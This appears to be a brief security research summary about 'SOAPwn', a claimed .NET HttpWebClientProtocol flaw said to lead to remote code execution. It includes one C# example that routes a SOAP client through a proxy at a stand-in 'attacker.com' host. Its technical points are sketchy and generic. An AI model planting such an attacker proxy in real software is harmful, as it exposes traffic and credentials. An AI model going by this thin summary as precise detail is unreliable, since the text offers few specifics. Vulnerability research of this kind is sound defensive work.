SOAPwn starts with a single flaw in HttpWebClientProtocol that Microsoft refused to fix, then develops into a powerful exploitation sink enabling RCE on multiple products.

## Introduction

This research explores vulnerabilities in .NET Framework's SOAP client implementations, demonstrating how seemingly minor issues can be chained into remote code execution.

## The Core Issue

Microsoft HttpWebClientProtocol has a flaw that allows:
- Proxy authentication bypass
- WSDL manipulation
- Internal network access

## Technical Details

### SOAP Basics

SOAP (Simple Object Access Protocol) uses:
- WSDL for service description
- HTTP for transport
- XML for message format

### The Vulnerability

The issue stems from how .NET handles:
1. Proxy settings in HttpWebClientProtocol
2. WSDL parsing and endpoint resolution
3. Authentication credentials

### Exploitation

```csharp
// Example vulnerable SOAP client configuration
var service = new MyService();
service.Proxy = new WebProxy("http://attacker.com");
```

## Impact

Multiple products affected:
- Enterprise software
- Web services
- Internal tools
